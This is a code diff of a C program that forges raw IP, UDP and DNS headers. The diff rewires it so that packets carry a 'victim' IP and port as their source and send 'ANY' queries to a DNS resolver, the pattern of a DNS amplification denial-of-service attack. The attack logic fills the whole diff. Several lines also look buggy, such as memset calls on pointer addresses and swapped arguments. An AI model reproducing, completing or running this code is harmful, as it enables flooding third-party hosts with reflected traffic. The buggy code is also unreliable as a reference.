@@ -130,15 +130,23 @@ const char* g_ansi = {
     "            the-scientist@rootstorm.com\n\n"
 };
 
-bool insert_question(void** buf, size_t* buflen, const char* domain, uint16_t query_type, uint16_t query_class);
-bool insert_data(void** dst, size_t* dst_buflen, const void* src, size_t src_len);
-bool insert_dns_header(uint8_t** buf, size_t* buflen, const DNSHEADER* header);
+bool
+insert_dns_header(uint8_t** buf, size_t* buflen, const DNSHEADER* header);
+bool
+insert_dns_question(void** buf, size_t* buflen, const char* domain, uint16_t query_type, uint16_t query_class);
+void
+pack_dnshdr(DNSHEADER* dnshdr, uint8_t opcode, uint8_t rcode);
+void
+pack_udphdr(UDPHEADER* udphdr, PSEUDOHDR* pseudohdr, size_t nwritten, const char* dport, const char* sport);
+void
+pack_iphdr(IPHEADER* iphdr, PSEUDOHDR* pseudohdr, const char* sourceip, const char* destip, size_t nwritten, size_t udpsz);
+bool
+insert_data(void** dst, size_t* dst_buflen, const void* src, size_t src_len);
+uint16_t
+checksum(const long* addr, int count);
 
-void pack_iphdr(IPHEADER* iphdr, PSEUDOHDR* pseudohdr, const char* sourceip, const char* destip, size_t nwritten, size_t udpsz);
-void pack_udphdr(UDPHEADER* udphdr, PSEUDOHDR* pseudohdr, size_t nwritten, const char* port);
-uint16_t checksum(const long* addr, int count);
-
-int main(int argc, char** argv)
+int
+main(int argc, char** argv)
 {
     const char* resolvip, * victimport, * victimip, * resolvprt;
     uint8_t pktbuf[ NS_PACKETSZ ], * curpos;
@@ -147,16 +155,7 @@ int main(int argc, char** argv)
     int raw_sockfd;
     bool status;
 
-    DNSHEADER dnsheader = {
-        ID,
-        RD, TC, AA, ns_o_query, QR,
-        ns_r_noerror, CD, AD, Z, RA,
-        QDCOUNT,
-        ANCOUNT,
-        NSCOUNT,
-        ARCOUNT
-    };
-
+    DNSHEADER dnsheader;
     UDPHEADER udpheader;
     IPHEADER ipheader;
     PSEUDOHDR pseudoheader;
@@ -175,10 +174,11 @@ int main(int argc, char** argv)
     buflen = NS_PACKETSZ;
     memset(pktbuf, NS_PACKETSZ, 0);
 
+    pack_dnshdr(&dnsheader, ns_o_query, ns_r_noerror);
     curpos = pktbuf;
     status = true;
     status &= insert_dns_header(curpos, &buflen, &dnsheader);
-    status &= insert_question(( void** ) curpos, &buflen, resolvip, ns_t_any, ns_c_any);
+    status &= insert_dns_question(( void** ) curpos, &buflen, resolvip, ns_t_any, ns_c_any);
 
     if (status == false) {
         fprintf(stderr, "create_dns_packet error\n");
@@ -192,8 +192,8 @@ int main(int argc, char** argv)
     }
 
     nwritten = NS_PACKETSZ - buflen;
-    pack_iphdr(&ipheader, &pseudoheader, srcip, dstip, nwritten, sizeof(UDPHEADER));
-    pack_udphdr(&udpheader, &pseudoheader, nwritten, dstprt, &addr);
+    pack_iphdr(&ipheader, &pseudoheader, victimip, resolvip, nwritten, sizeof(UDPHEADER));
+    pack_udphdr(&udpheader, &pseudoheader, nwritten, resolvprt, victimport);
 
     addr.sin_family = AF_INET;
     addr.sin_port = udpheader.uh_dport;
@@ -211,9 +211,50 @@ fail_state:
 }
 
 void
-pack_iphdr(IPHEADER* iphdr, PSEUDOHDR* pseudohdr,
-        const char* sourceip, const char* destip,
-        size_t nwritten, size_t udpsz)
+pack_dnshdr(DNSHEADER* dnshdr, uint8_t opcode, uint8_t rcode)
+{
+    dnshdr->id = ID;
+    dnshdr->rd = RD;
+    dnshdr->tc = TC;
+    dnshdr->aa = AA;
+    dnshdr->opcode = opcode;
+    dnshdr->qr = QR;
+    dnshdr->rcode = rcode;
+    dnshdr->cd = CD;
+    dnshdr->ad = AD;
+    dnshdr->unused = Z;
+    dnshdr->ra = RA;
+    dnshdr->qdcount = QDCOUNT;
+    dnshdr->ancount = ANCOUNT;
+    dnshdr->nscount = NSCOUNT;
+    dnshdr->arcount = ARCOUNT;
+}
+
+void
+pack_udphdr(UDPHEADER* udphdr, PSEUDOHDR* pseudohdr, size_t nwritten, const char* dport, const char* sport)
+{
+    uint16_t dport_uint16;
+    uint16_t sport_uint16;
+
+    errno = 0;
+    dport_uint16 = ( uint16_t ) strtol(dport, NULL, 0);
+    sport_uint16 = ( uint16_t ) strtol(sport, NULL, 0);
+    if (errno != 0) {
+        perror("port error: strtol");
+        exit(EXIT_FAILURE);
+    }
+
+    memset(&udphdr, 0, sizeof(UDPHEADER));
+    udphdr->uh_dport = htons(dport_uint16); // nameserver port
+    udphdr->uh_sport = htons(sport_uint16); // victim port
+    udphdr->uh_ulen = htons(nwritten + sizeof(UDPHEADER));
+    pseudohdr->udplen = udphdr->uh_ulen;
+
+    udphdr->check = checksum(( const long* ) &pseudohdr, ( int ) sizeof(PSEUDOHDR));
+}
+
+void
+pack_iphdr(IPHEADER* iphdr, PSEUDOHDR* pseudohdr, const char* sourceip, const char* destip, size_t nwritten, size_t udpsz)
 {
     memset(&iphdr, 0, sizeof(IPHEADER));
     iphdr->version = IPVER;
@@ -233,27 +274,8 @@ pack_iphdr(IPHEADER* iphdr, PSEUDOHDR* pseudohdr,
     iphdr->check = checksum(( const long* ) &iphdr, ( int ) sizeof(IPHEADER));
 }
 
-void pack_udphdr(UDPHEADER* udphdr, PSEUDOHDR* pseudohdr, size_t nwritten, const char* port)
-{
-    uint16_t port_uint16;
-
-    errno = 0;
-    port_uint16 = ( uint16_t ) strtol(port, NULL, 0);
-    if (errno != 0) {
-        perror("port error: strtol");
-        exit(EXIT_FAILURE);
-    }
-
-    memset(&udphdr, 0, sizeof(UDPHEADER));
-    udphdr->uh_dport = htons(port_uint16);
-    udphdr->uh_sport = 0x00;
-    udphdr->uh_ulen = htons(nwritten + sizeof(UDPHEADER));
-    pseudohdr->udplen = udphdr->uh_ulen;
-
-    udphdr->check = checksum(( const long* ) &pseudohdr, ( int ) sizeof(PSEUDOHDR));
-}
-
-bool insert_dns_header(uint8_t** buf, size_t* buflen, const HEADER* header)
+bool
+insert_dns_header(uint8_t** buf, size_t* buflen, const HEADER* header)
 {
     bool status;
     uint8_t third_byte, fourth_byte;
@@ -288,7 +310,8 @@ bool insert_dns_header(uint8_t** buf, size_t* buflen, const HEADER* header)
     return status;
 }
 
-bool insert_question(void** buf, size_t* buflen, const char* domain, uint16_t query_type, uint16_t query_class)
+bool
+insert_dns_question(void** buf, size_t* buflen, const char* domain, uint16_t query_type, uint16_t query_class)
 {
     const char* token;
     char* saveptr, qname[ NS_PACKETSZ ];
@@ -321,7 +344,8 @@ bool insert_question(void** buf, size_t* buflen, const char* domain, uint16_t qu
     return status;
 }
 
-bool insert_data(void** dst, size_t* dst_buflen, const void* src, size_t src_len)
+bool
+insert_data(void** dst, size_t* dst_buflen, const void* src, size_t src_len)
 {
     if (*dst_buflen < src_len) {
         return false;
@@ -334,7 +358,8 @@ bool insert_data(void** dst, size_t* dst_buflen, const void* src, size_t src_len
     return true;
 }
 
-uint16_t checksum(const long* addr, int count)
+uint16_t
+checksum(const long* addr, int count)
 {
     register long sum = 0;
 
